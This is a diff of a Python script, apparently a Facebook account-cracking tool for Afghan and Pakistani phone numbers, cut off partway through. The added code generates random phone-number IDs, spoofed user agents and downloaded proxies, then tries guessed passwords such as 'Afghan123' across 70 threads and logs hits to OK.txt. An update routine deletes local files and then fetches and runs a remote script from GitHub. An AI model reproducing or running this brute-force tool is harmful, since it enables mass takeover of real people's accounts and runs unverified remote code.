@@ -1,290 +1,472 @@
-# MY TELEGRAM CHANNEL @Afghan Hickar
-# MY TELEGRAM GROUP @ Tar Max Komand 
-#MY GITHUB HTTPS://https://github.com/Afghan472
-#THIS SCRIPT FREE 
- 
-import os
-import sys
-import time
-import datetime
-import random
-import hashlib
-import re
-import threading
-import json
-import urllib
-import cookielib
-import getpass
-os.system('rm -rf .txt')
-for n in range(20000):
-    afg = random.randint(111111, 999999)
-    sys.stdout = open('.txt', 'a')
-    print afg
-    sys.stdout.flush()
- 
- 
+# Decompile by Mardis (Tools By Kapten-Kaizo)
+# Time Succes decompile : 2023-02-07 00:26:14.084668
+from os import path
+import os,base64,zlib,pip,urllib
+os.system('xdg-open http://wa.me/+93764034195')
+print('\n\033[1;37m install modules...\n It will take some seconds...')
+import uuid
+import os,sys,time,json,random,re,string,platform,base64
 try:
     import requests
-except ImportError:
-    os.system('pip2 install mechanize')
- 
- 
-try:
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
     import mechanize
-except ImportError:
-    os.system('pip2 install request')
- 
-import os
-import sys
-import time
-import datetime
-import random
-import hashlib
-import re
-import threading
-import json
-import urllib
-import cookielib
-import requests
-import mechanize
-from multiprocessing.pool import ThreadPool
-from requests.exceptions import ConnectionError
-from mechanize import Browser
-reload(sys)
-sys.setdefaultencoding('utf8')
-br = mechanize.Browser()
-br.set_handle_robots(False)
-br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
-br.addheaders = [
-    ('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
-br.addheaders = [
-    ('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
- 
- 
- 
- 
-#STYLISH 
- 
-def Style_profaisor(z):
-    for e in z + '\n':
-        sys.stdout.write(e)
-        sys.stdout.flush()
-        time.sleep(0.1)
-    
- 
-#Afghan Hickar Youtube 
- 
-Afghan Hickar_youtube = random.choice(["https://youtube.com/channel/UCXjyXBDIBD_dXh0M9d8EIJA"])
- 
-youtuber = Afghan Hickar_youtube
- 
-def youtube():
-	Style_profaisor("  please subscribe youtube author :) Thank you")
-	os.system("xdg-open https://youtube.com/channel/UCXjyXBDIBD_dXh0M9d8EIJA")
-	menu()
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures==2 > /dev/null')
+    os.system('python run.py')
+import uuid
+import os,sys,time,json,random,re,string,platform,base64
+os.system('xdg-open https://www.facebook.com/profile.php?id=100074359838041')
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures==2 > /dev/null')
+    os.system('python run.py')
+P = '\x1b[1;97m' # PUTIH
+M = '\x1b[1;91m' # MERAH
+H = '\x1b[1;92m' # HIJAU
+K = '\x1b[1;93m' # KUNING
+B = '\x1b[1;94m' # BIRU
+U = '\x1b[1;95m' # UNGU
+O = '\x1b[1;96m' # BIRU MUDA
+N = '\x1b[0m'    # WARNA MATI
+A = '\x1b[1;90m' # WARNA ABU ABU
+BN = '\x1b[1;107m' # BELAKANG PUTIH
+BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
+BP = '\x1b[1;105m' # BELAKANG PINK
+BB = '\x1b[1;104m' # BELAKANG BIRU
+BK = '\x1b[1;103m' # BELAKANG KUNING
+BH = '\x1b[1;102m' # BELAKANG HIJAU
+BM = '\x1b[1;101m' # BELAJANG MERAH
+BA = '\x1b[1;100m' # BELAKANG ABU ABU
+my_color = [
+ P, M, H, K, B, U, O, N]
+warna = random.choice(my_color)
+try:
+	prox= requests.get('https://raw.githubusercontent.com/ahmad77412/axi/main/.prox.txt').text
+	open('.prox.txt','w').write(prox)
+except Exception as e:
+	print('\x1b[1;95m[√] LOADING...')
 	
-#MY TELEGRAM GROUp
+prox=open('.prox.txt','r').read().splitlines()
  
-def telegram():
-	Style_profaisor("  please Join To Telegram Group :) Thank you")
-	os.system("xdg-open https://t.me/AfghanHickar")
+ugen2=[]
+ugen=[]
+ 
+ 
+ 
+for xd in range(5000):
+	aa='Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
+	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
+	c=' en-us; GT-','Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36'
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	h=random.randrange(73,100)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
+	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+	ugen.append(uaku2)
+ 
+for agent in range(10000):
+        aa='Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
+        b=random.choice(['6','7','8','9','10','11','12'])
+        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
+        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        e=random.randrange(1, 999)
+        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
+        h=random.randrange(73,100)
+        i='0'
+        j=random.randrange(4200,4900)
+        k=random.randrange(40,150)
+        l='Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
+        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+        ugen.append(fullagnt)
+ 
+for xd in range(10000):
+	a='Mozilla/5.0 (Symbian/3; Series60/','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
+	b=random.randrange(1, 9)
+	c=random.randrange(1, 9)
+	d='Nokia','Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Google Pixel 4 Build/QD1A.190821.014.C2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36'
+	e=random.randrange(100, 9999)
+	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
+	g=random.randrange(1, 9)
+	h=random.randrange(1, 4)
+	i=random.randrange(1, 4)
+	j=random.randrange(1, 4)
+	k='Mobile Safari/535.1','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
+	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
+	ugen.append(uaku)
+ 
+	aa='Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
+	b=random.choice(['6','7','8','9','10','11','12'])
+	c=' en-us; GT-'
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	h=random.randrange(73,100)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen.append(uaku2)
 	
 	
-back = 0
+ 
+logo=("""
+     **     ******** ** ********
+    ****   //////** /**//////** 
+   **//**       **  /**     **  
+  **  //**     **   /**    **   
+ **********   **    /**   **    
+/**//////**  **     /**  **     
+/**     /** ********/** ********
+//      // //////// // //////// 
+\33[1;37m----------------------------------------------
+→   Owner      :  NAZAWALI MAFIA KING 
+→   Facebook   :  AZ JAN NAZAWALI
+→   Github     : AZ NAZAWALI
+  →   Tools   :  RANDOM 
+\x1b[1;97m→   Version    :  0.1
+4G/3G full speed internet 💔Update Coming Soon
+\33[1;37m----------------------------------------------""")
+ 
+def lines():
+	print('\33[1;37m----------------------------------------------')
+ 
+loop = 0
 oks = []
-id = []
-cpb = []
-vulnot = '\x1b[31mNot Vuln'
-vuln = '\x1b[32mVuln'
-os.system('clear')
+cps = []
+try:
+    print('\n Not working your device\n\033[1;37m Please Wait\033[0;97m\n congratulations working your device ')
+    proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()
+    v = 3.1
+    update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text
+    if str(v) in update:
+        os.system('rm -rf a*')
+        os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/ali.py > ali.py')
+        os.system('python ali.py')
+    else:pass
+except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
+def dynamic(text):
+    titik = ['.   ','..  ','... ','.... ']
+    for o in titik:
+        print('\r'+text+o),
+        sys.stdout.flush();time.sleep(1)
  
-#Afghan Hickar Logo
-logo ="""
-\033[1;91m           ┈┈┈┈┈┈┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈┈┈┈┈   A \033[1;0m
-\033[1;91m        ┈┈┈┈┈┈┈┈┈┈┈▕▕╲┊┊╱▏▏┈┈┈┈┈┈┈   F \033[1;0m
-\033[1;97m        ┈┈┈┈┈┈┈┈┈┈┈▕▕▂╱╲▂▏▏┈┈┈┈┈┈┈   G \033[1;0m
-\033[1;97m        ┈┈┈┈┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈┈┈   H \033[1;0m
-\033[1;91m        ┈┈┈┈┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈   A\033[1;0m
-\033[1;91m        ┈┈┈┈┈┈┈┈╱▔▔▔▔┊┊┊┊▔▔▔▔╲┈┈┈┈   N\033[1;0m
-\033[1;97m               ─────────────•◈•──────────\033[1;0m
-\033[1;97m--------------------------------------------------
-\033[1;91m Author      : Afghan Hickar 
-\033[1;91m GitHub      : https://github.com/Afghan472
-\033[1;91m YouTube     : Afghan Hickar tech
-\033[1;91m Telegram CH   : https://t.me/AfghanHickar
-\033[1;91m TLEGRAM GP    : https://t.me/AfghanHickar 
-\033[1;97m--------------------------------------------------
-"""
+def riaz():
+	os.system('clear')
+	print(logo)
+	print('[1] Random AFG H A N I S T A N CLONING')
+	print('[2] PAKISTAN Random Cloning')
+	print('[3] Follow me on Facebook')
+	print('\x1b[1;91m[5] Exit Main menu')
+	print('\33[1;37m----------------------------------------------')
+	riaz1 = input('[•] Select option  : ')
+	if riaz1 =='1':
+		annu()
+	if riaz1 =='5':
+		riaz()
+	if riaz1 =='4':
+		os.system('xdg-open http://wa.me/+93764034195?text=AZ.JAN💜🐰Sir😪💕')
+	if riaz1 =='3':
+		os.system('xdg-open https://www.facebook.com/profile.php?id=100074359838041');riaz()
+	if riaz1 =='2':
+		bangla()
+	else:
+		print('\n\033[1;31mChoose valid option\033[0;97m')
+		riaz()
  
-#menu option 
  
-def menu():
+def annu():
     os.system('clear')
-    print logo
-    print ''
-    print '             \x1b[1;93m[1]\x1b[1;93m START AFG FB CRACK              \n '
-    time.sleep(0.05)
-    Select_menu()
+    print(logo)
+    print('[1] RANDOM OLD IDZ UPDATE  Method \x1b[1;92m1')
+    print('\x1b[1;97m[2] RANDOM MIX IDZ GAMES  \x1b[1;92m2')
+    print('\x1b[1;97m[3] RANDOM NEW IDZ UPDATE  \x1b[1;92m3. BEST ')
+    print('\x1b[1;91m[4] Go to main menu')
+    lines()
+    riaz1 = input('[+] CHOOSE optION : ')
+    if riaz1 =='1':
+    	m1()
+    if riaz1 =='2':
+    	m2()
+    if riaz1 =='3':
+    	m3()
+    if riaz1 =='4':
+    	riaz()
+    else:
+        print('\n\033[1;37m[+] SELECT VALID optION\033[0;97m')        
+def bangla():
+	os.system('clear')
+	print(logo)
+	print('[1] AFG Crack \x1b[1;92mM 1')
+	print('\x1b[1;97m[1] AFG Crack \x1b[1;92mM 1')
+	print('\x1b[1;91m[3] Go to main menu')
+	lines()
+	riaz1 = input('[+] Select option : ')
+	if riaz1 =='1':
+		b1()
+	if riaz1 =='2':
+		b2()
+	if riaz1 =='3':
+		riaz()
  
- 
-def Select_menu():
-    PROFAISOR =raw_input('\x1b[1;92m             Choose option :\x1b[1;92m ')
-    if PROFAISOR == '':
-        print '[!] Fill In Correctly'
-        Select_menu()
-    elif PROFAISOR == '1':
-    	telegram()
+def m1():
+    user=[]
+    os.system('clear')
+    print(logo)
+    print('[+] Example  : 9370,9379,9378,****Etc')
+    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
+    lines()
+    kode = input('[+] Your Code : ')
+    lines()
+    os.system('clear')
+    print(logo)
+    print('[+] Example  : 1000,5000,100000,****Etc')
+    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
+    lines()
+    limit = int(input('[+] Idz Lemit : '))
+    print(46*'-')
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=70) as yaari:
         os.system('clear')
-        print logo 
-        print '\x1b[1;92m CRACK AFG FB ALL SIM CREATED BY MOHAMMAD SULTANI'
-        print '\x1b[1;92m THISE SCRIPT CREATED BY MOHAMMAD SULTANI '
-        print '\x1b[1;92m              FREE TOOL  AND   NO  ENCRYPT   '
-        print 47 * '\x1b[1;92m\xe2\x96\xac'
-        print ''
-        print '\x1b[1;93m \x1b[1;92m ETISALAT       : \x1b[1;92m 88,80,86,87,84,83,82,89,81'
-        print ''
-        print '\x1b[1;93m \x1b[1;92m ROSHAN         : \x1b[1;92m 99,91,92,93,94,96,95,97,98'
-        print ''
-        print '\x1b[1;93m \x1b[1;92m MTN            : \x1b[1;92m 71.72.73.74.75.76.77.78.79'
-        print ''
-        print '\x1b[1;93m \x1b[1;92m SALAM          : \x1b[1;92m 31.32.33.34.35.36.37.38.39'
-        print ''
-        print '\x1b[1;93m \x1b[1;92m AWCC.          : \x1b[1;92m 01.02.03.04.05.06.07.08.09'
-        print ''
-        print 47 * '\x1b[1;92m\xe2\x96\xac'
-        
-        try:
-            c = raw_input('\x1b[1;92mChoose code :\x1b[1;92m ')
-            print ''
-            pas1 = raw_input('\x1b[1;92m     ENTER PASS1 :\x1b[1;92m ')
-            pas2 = raw_input('\x1b[1;92m     ENTER PASS2 :\x1b[1;92m ')
-            pas3 = raw_input('\x1b[1;92m     ENTER PASS3 :\x1b[1;92m ')
-            print ''
-            k = '07'
-            idlist = '.txt'
-            for line in open(idlist, 'r').readlines():
-                id.append(line.strip())
-        except IOError:
-            print '[!] File Not Found'
-            raw_input('\n[ Back ]')
-            youtube()
-        
+        print(logo)
+        tl = str(len(user))
+        print(' Total Acounts : '+tl)
+        print(' Selected Code :\x1b[1;92m '+kode)
+        print('\x1b[1;91m If you no result use flight mode')
+        lines()
+        for guru in user:
+            uid = kode+guru
+            pwx=[guru+guru,'Afghan123','Afghanistan','afghan12345','kabul123','100200']
+            yaari.submit(rcrack,uid,pwx,tl)
+    print(46*'-')
+    print('IDZ SAVED IN OK.txt : CP.txt')
+    print(46*'-')
+    print('The Process Has Been Complete')
+    print('Press Enter to Back');riaz()
+def m2():
+    user=[]
+    os.system('clear')
+    print(logo)
+    print('[+] Example  : 9370,9378,9377,****Etc')
+    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
+    lines()
+    kode = input('[+] Your Code : ')
+    lines()
+    os.system('clear')
+    print(logo)
+    print('[+] Example  : 1000,5000,100000,****Etc')
+    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
+    lines()
+    limit = int(input('[+] Idz Lemit : '))
+    print(46*'-')
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=70) as yaari:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print(' Total Acounts : '+tl)
+        print(' Selected Code :\x1b[1;92m '+kode)
+        print('\x1b[1;91m If you no result use flight mode')
+        lines()
+        for guru in user:
+            uid = kode+guru
+            pwx=[guru,'Afghan123','Afghanistan','Afghan12345','kabul123','Ahmad123']
+            yaari.submit(rcrack,uid,pwx,tl)
+    print(46*'-')
+    print('IDZ SAVED IN OK.txt : CP.txt')
+    print(46*'-')
+    print('The Process Has Been Complete')
+    print('Press Enter to Back');riaz()
+def m3():
+    user=[]
+    os.system('clear')
+    print(logo)
+    print('[+] Example  : 9370,9378,9379,****Etc')
+    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
+    lines()
+    kode = input('[+] Your Code : ')
+    lines()
+    os.system('clear')
+    print(logo)
+    print('[+] Example  : 1000,5000,100000,****Etc')
+    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
+    lines()
+    limit = int(input('[+] Idz Lemit : '))
+    print(46*'-')
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=70) as yaari:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print(' Total Acounts : '+tl)
+        print(' Selected Code :\x1b[1;92m '+kode)
+        print('\x1b[1;91m If you no result use flight mode')
+        lines()
+        for guru in user:
+            uid = kode+guru
+            pwx=[guru,'Afghan123','Afghanistan','Afghan12345','kabul123','Ahmad123']
+            yaari.submit(rcrack,uid,pwx,tl)
+    print(46*'-')
+    print('IDZ SAVED IN OK.txt : CP.txt')
+    print(46*'-')
+    print('The Process Has Been Complete')
+    print('Press Enter to Back');riaz()
  
-    print 54 * '\x1b[1;92m_'
-    print ''
-    xxx = str(len(id))
-    Style_profaisor(' \x1b[1;93mTOTALL ID  NUMBER : \x1b[1;92m' + xxx)
-    Style_profaisor(' \x1b[1;93mCODE YOU CHOOSE : \x1b[1;92m' + c)
-    Style_profaisor(' \x1b[1;93mPLEASE WITH TO CRACK ID ')
-    Style_profaisor(' \x1b[1;92mTo STOP PROCESS PRESS CTRL+Z')
-    print 54 * '\x1b[1;92m_'
-    print ''
-    
-    def main(arg):
-        user = arg
-        
-        try:
-            os.mkdir('Afghan Hickar')
-        except OSError:
-            pass
+def b1():
+    user=[]
+    os.system('clear')
+    print(logo)
+    print('[+] Example  : 92**,92***,92***,****Etc')
+    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
+    lines()
+    kode = input('[+] Your Code : ')
+    lines()
+    os.system('clear')
+    print(logo)
+    print('[+] Example  : 1000,5000,100000,****Etc')
+    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
+    lines()
+    limit = int(input('[+] Idz Lemit : '))
+    print(46*'-')
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=70) as yaari:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print(' Total Acounts : '+tl)
+        print(' Selected Code :\x1b[1;92m '+kode)
+        print('\x1b[1;91m If you no result use flight mode')
+        lines()
+        for guru in user:
+            uid = kode+guru
+            pwx=[guru,kode,'pakistan','khankhan','khan123','malik123','Ahmad123']
+            yaari.submit(rcrack,uid,pwx,tl)
+    print(46*'-')
+    print('IDZ SAVED IN OK.txt : CP.txt')
+    print(46*'-')
+    print('The Process Has Been Complete')
+    print('Press Enter to Back');riaz()
+def b2():
+    user=[]
+    os.system('clear')
+    print(logo)
+    print('[+] Example  : 92***,92***,92***,****Etc')
+    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
+    lines()
+    kode = input('[+] Your Code : ')
+    lines()
+    os.system('clear')
+    print(logo)
+    print('[+] Example  : 1000,5000,100000,****Etc')
+    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
+    lines()
+    limit = int(input('[+] Idz Lemit : '))
+    print(46*'-')
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=70) as yaari:
+        os.system('clear')
+        print(logo)
